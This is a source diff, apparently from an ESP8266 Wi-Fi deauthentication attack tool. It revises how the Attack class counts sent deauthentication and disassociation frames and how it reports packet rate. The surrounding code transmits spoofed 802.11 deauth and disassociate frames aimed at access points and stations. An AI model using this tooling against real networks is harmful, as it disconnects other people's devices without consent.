@@ -81,8 +81,8 @@ void Attack::updateCounter() {
 
   // deauth packets per second
   if (deauth.active) {
-    if (deauthAll) deauth.maxPkts = settings.getDeauthsPerTarget() * (scan.countAll() - names.selected());
-    else deauth.maxPkts = settings.getDeauthsPerTarget() * scan.countSelected();
+    if (deauthAll) deauth.maxPkts = settings.getDeauthsPerTarget() * (accesspoints.count() + stations.count()*2 - names.selected());
+    else deauth.maxPkts = settings.getDeauthsPerTarget() * (accesspoints.selected() + stations.selected()*2 + names.selected() + names.stations());
   } else {
     deauth.maxPkts = 0;
   }
@@ -107,17 +107,19 @@ void Attack::updateCounter() {
   deauthPkts = deauth.packetCounter;
   beaconPkts = beacon.packetCounter;
   probePkts = probe.packetCounter;
+  packetRate = tmpPacketRate;
   deauth.packetCounter = 0;
   beacon.packetCounter = 0;
   probe.packetCounter = 0;
   deauth.tc = 0;
   beacon.tc = 0;
   probe.tc = 0;
+  tmpPacketRate = 0;
 }
 
 void Attack::status() {
-  char s[80];
-  sprintf(s, str(A_STATUS).c_str(), deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts, probe.maxPkts);
+  char s[120];
+  sprintf(s, str(A_STATUS).c_str(), packetRate, deauthPkts, deauth.maxPkts, beaconPkts, beacon.maxPkts, probePkts, probe.maxPkts);
   prnt(String(s));
 }
 
@@ -272,13 +274,17 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
 
   // send deauth frame
   deauthPacket[0] = 0xc0;
-  if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets()))
+  if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets())){
     success = true;
+    deauth.packetCounter++;
+  }
 
   // send disassociate frame
   deauthPacket[0] = 0xa0;
-  if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets()))
+  if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets())){
     success = true;
+    deauth.packetCounter++;
+  }  
   
   // send another packet, this time from the station to the accesspoint
   if (!macBroadcast(stMac)) { // but only if the packet isn't a broadcast
@@ -289,19 +295,21 @@ bool Attack::deauthDevice(uint8_t* apMac, uint8_t* stMac, uint8_t reason, uint8_
   
     // send deauth frame
     deauthPacket[0] = 0xc0;
-    if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets()))
+    if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets())){
       success = true;
-  
+      deauth.packetCounter++;
+    }
+    
     // send disassociate frame
     deauthPacket[0] = 0xa0;
-    if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets()))
+    if (sendPacket(deauthPacket, packetSize, ch, settings.getForcePackets())){
       success = true;
+      deauth.packetCounter++;
+    }
   }
 
-  if (success){
+  if (success)
     deauth.time = currentTime;
-    deauth.packetCounter++;
-  }
 
   return success;
 }
@@ -373,10 +381,12 @@ bool Attack::sendPacket(uint8_t* packet, uint16_t packetSize, uint8_t ch, uint16
   bool sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
   
   // try again until it's sent out
-  for (int i = 0; i < tries && !sent; i++) {
+  for (int i = 0; i < tries && !sent; i++)
     sent = wifi_send_pkt_freedom(packet, packetSize, 0) == 0;
-  }
 
+  if(sent)
+    tmpPacketRate ++;
+  
   return sent;
 }
 
